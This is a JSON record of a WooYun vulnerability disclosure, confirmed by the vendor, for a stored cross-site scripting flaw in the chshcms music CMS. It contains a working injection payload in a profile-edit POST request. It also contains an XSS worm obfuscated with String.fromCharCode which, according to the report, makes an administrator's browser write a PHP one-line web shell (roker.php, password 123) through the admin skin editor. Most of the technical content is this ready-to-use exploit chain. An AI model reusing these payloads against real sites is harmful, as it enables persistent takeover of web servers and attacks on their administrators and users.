{"id": 60619, "wybug_id": "wooyun-2013-042552", "wybug_title": "程氏舞曲CMS又一储存型xss", "wybug_corp": "chshcms.com", "wybug_author": "roker", "wybug_date": "2013-11-11 10:44", "wybug_open_date": "2013-12-26 10:45", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-26：\t细节向公众公开  简要描述： xss 详细说明：  官网修补的不太彻底啊。。同样是修改  资料处。火狐 修改下 post包提交CS_Name=aaaaaa&CS_Email=a%40qq.com&CS_Nichen=aaaaaa&CS_Sex=0&CS_City=%C1%C9%C4%FE%CA%A1&CS_QQ=111111111&CS_Qianm=<isindex type=image src=1 onerror=alert(/'xss'/)>\n\n出来了。。\n\n后台还是可以 写入任意文件。。。构造 xss worm如下 \n<isindex type=image src=1 onerror=\"eval(String.fromCharCode(116,104,105,115,84,72,111,115,116,32,61,32,116,111,112,46,108,111,99,97,116,105,111,110,46,104,111,115,116,110,97,109,101,59,13,116,104,105,115,84,72,111,115,116,32,61,32,34,104,116,116,112,58,47,47,34,32,43,32,116,104,105,115,84,72,111,115,116,32,43,32,34,47,97,100,109,105,110,47,115,107,105,110,115,47,115,107,105,110,115,46,112,104,112,63,97,99,61,120,103,109,98,38,111,112,61,103,111,38,112,97,116,104,61,46,46,47,46,46,47,115,107,105,110,115,47,105,110,100,101,120,47,104,116,109,108,47,34,59,13,102,117,110,99,116,105,111,110,32,80,111,115,116,83,117,98,109,105,116,40,117,114,108,44,32,100,97,116,97,44,32,109,115,103,41,32,123,32,13,32,32,32,32,118,97,114,32,112,111,115,116,85,114,108,32,61,32,117,114,108,59,13,32,32,32,32,118,97,114,32,112,111,115,116,68,97,116,97,32,61,32,100,97,116,97,59,32,13,32,32,32,32,118,97,114,32,109,115,103,68,97,116,97,32,61,32,109,115,103,59,32,13,32,32,32,32,118,97,114,32,69,120,112,111,114,116,70,111,114,109,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,70,79,82,77,34,41,59,32,13,32,32,32,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,69,120,112,111,114,116,70,111,114,109,41,59,32,13,32,32,32,32,69,120,112,111,114,116,70,111,114,109,46,109,101,116,104,111,100,32,61,32,34,80,79,83,84,34,59,32,13,32,32,32,32,118,97,114,32,110,101,119,69,108,101,109,101,110,116,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,105,110,112,117,116,34,41,59,32,13,32,32,32,32,110,101,119,69,108,101,109,101,110,116,46,115,101,116,65,116,116,114,105,98,117,116,101,40,34,110,97,109,101,34,44,32,34,110,97,109,101,34,41,59,32,13,32,32,32,32,110,101,119,69,108,101,109,101,110,116,46,115,101,116,65,116,116,114,105,98,117,116,101,40,34,116,121,112,101,34,44,32,34,104,105,100,100,101,110,34,41,59,32,13,32,32,32,32,118,97,114,32,110,101,119,69,108,101,109,101,110,116,50,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,105,110,112,117,116,34,41,59,32,13,32,32,32,32,110,101,119,69,108,101,109,101,110,116,50,46,115,101,116,65,116,116,114,105,98,117,116,101,40,34,110,97,109,101,34,44,32,34,99,111,110,116,101,110,116,34,41,59,32,13,32,32,32,32,110,101,119,69,108,101,109,101,110,116,50,46,115,101,116,65,116,116,114,105,98,117,116,101,40,34,116,121,112,101,34,44,32,34,104,105,100,100,101,110,34,41,59,32,13,32,32,32,32,69,120,112,111,114,116,70,111,114,109,46,97,112,112,101,110,100,67,104,105,108,100,40,110,101,119,69,108,101,109,101,110,116,41,59,32,13,32,32,32,32,69,120,112,111,114,116,70,111,114,109,46,97,112,112,101,110,100,67,104,105,108,100,40,110,101,119,69,108,101,109,101,110,116,50,41,59,32,13,32,32,32,32,110,101,119,69,108,101,109,101,110,116,46,118,97,108,117,101,32,61,32,112,111,115,116,68,97,116,97,59,32,13,32,32,32,32,110,101,119,69,108,101,109,101,110,116,50,46,118,97,108,117,101,32,61,32,109,115,103,68,97,116,97,59,32,13,32,32,32,32,69,120,112,111,114,116,70,111,114,109,46,97,99,116,105,111,110,32,61,32,112,111,115,116,85,114,108,59,32,13,32,32,32,32,69,120,112,111,114,116,70,111,114,109,46,115,117,98,109,105,116,40,41,59,32,13,125,59,13,80,111,115,116,83,117,98,109,105,116,40,116,104,105,115,84,72,111,115,116,44,34,114,111,107,101,114,46,112,104,112,34,44,34,60,63,112,104,112,32,64,101,118,97,108,40,36,95,80,79,83,84,91,49,50,51,93,41,59,63,62,34,41,59))\">\n管理员触发到xss后就会 在 skins\\index\\html\\目录下生成 roker.php 密码123的一句话木马   漏洞证明：  \n\n   修复方案：  过滤 <>   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-11-11 17:52 厂商回复： 感谢您的漏洞提醒！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}